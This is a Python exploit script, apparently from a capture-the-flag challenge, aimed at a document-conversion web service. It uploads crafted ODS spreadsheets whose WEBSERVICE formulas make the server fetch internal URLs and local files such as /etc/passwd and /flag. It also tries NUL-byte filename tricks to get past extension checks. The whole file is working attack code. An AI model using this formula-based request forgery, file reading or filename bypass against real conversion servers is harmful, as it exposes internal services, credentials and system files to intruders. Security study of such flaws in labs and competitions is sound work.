#!/usr/bin/env python3
"""Temporary CTF spreadsheet-formula and filename probe."""
import html
import io
import pathlib
import urllib.error
import urllib.request
import uuid
import zipfile

BASE = "http://njwqato3tpdz0t6k.instances.ctfcup.online"
POC = pathlib.Path(__file__).with_name("poc.odt")


def send(data, filename, fmt, label):
    boundary = "----Arena" + uuid.uuid4().hex
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="data"; filename="{filename}"\r\n'
        "Content-Type: application/octet-stream\r\n\r\n"
    ).encode() + data + f"\r\n--{boundary}--\r\n".encode()
    req = urllib.request.Request(BASE + "/cool/convert-to/" + fmt, data=body, method="POST")
    req.add_header("Content-Type", "multipart/form-data; boundary=" + boundary)
    print("\n===", label, "FILENAME_REPR", repr(filename), flush=True)
    try:
        with urllib.request.urlopen(req, timeout=90) as r:
            raw = r.read(500000)
            print("STATUS", r.status, "BYTES", len(raw), "RESPONSE", raw.decode("utf-8", "replace"), flush=True)
    except urllib.error.HTTPError as e:
        print("HTTP_ERROR", e.code, e.read(200000).decode("utf-8", "replace"), flush=True)
    except Exception as e:
        print("ERROR", repr(e), flush=True)


def formula_ods(formula):
    content = f'''<?xml version="1.0" encoding="UTF-8"?>
<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" xmlns:of="urn:oasis:names:tc:opendocument:xmlns:of:1.2" office:version="1.2">
<office:body><office:spreadsheet><table:table table:name="Sheet1"><table:table-row>
<table:table-cell table:formula="of:={html.escape(formula, quote=True)}" office:value-type="string"><text:p></text:p></table:table-cell>
</table:table-row></table:table></office:spreadsheet></office:body></office:document-content>'''
    manifest = '''<?xml version="1.0" encoding="UTF-8"?>
<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0" manifest:version="1.2">
<manifest:file-entry manifest:full-path="/" manifest:media-type="application/vnd.oasis.opendocument.spreadsheet"/>
<manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml"/>
</manifest:manifest>'''
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w") as z:
        z.writestr("mimetype", "application/vnd.oasis.opendocument.spreadsheet", compress_type=zipfile.ZIP_STORED)
        z.writestr("content.xml", content, compress_type=zipfile.ZIP_DEFLATED)
        z.writestr("META-INF/manifest.xml", manifest, compress_type=zipfile.ZIP_DEFLATED)
    return out.getvalue()


def marked_odt():
    out = io.BytesIO()
    with zipfile.ZipFile(POC) as zin, zipfile.ZipFile(out, "w") as zout:
        for info in zin.infolist():
            data = zin.read(info.filename)
            if info.filename == "content.xml":
                data = data.replace(b"<text:section", b"<text:p>ARENA_MARKER</text:p><text:section", 1)
            zout.writestr(info, data)
    return out.getvalue()


for formula in (
    'INFO("release")',
    'CELL("FILENAME")',
    'COM.MICROSOFT.WEBSERVICE("http://webapp:8000/")',
    'COM.MICROSOFT.WEBSERVICE("http://webapp:8000/flag")',
    'COM.MICROSOFT.WEBSERVICE("http://webapp:8000/internal/flag")',
    'COM.MICROSOFT.WEBSERVICE("http://webapp:8000/debug/vars")',
    'COM.MICROSOFT.WEBSERVICE("http://webapp:8000/env")',
    'COM.MICROSOFT.WEBSERVICE("http://127.0.0.1:9980/hosting/capabilities")',
    'COM.MICROSOFT.WEBSERVICE("http://collabora:9980/hosting/capabilities")',
    'COM.MICROSOFT.WEBSERVICE("file:///etc/passwd")',
    'COM.MICROSOFT.WEBSERVICE("file:///flag")',
):
    send(formula_ods(formula), "formula.ods", "csv", formula)

odt = marked_odt()
for filename in ("probe.odt\x00.txt", "probe.odt%00.txt"):
    send(odt, filename, "txt", "NUL_EXTENSION_BYPASS")
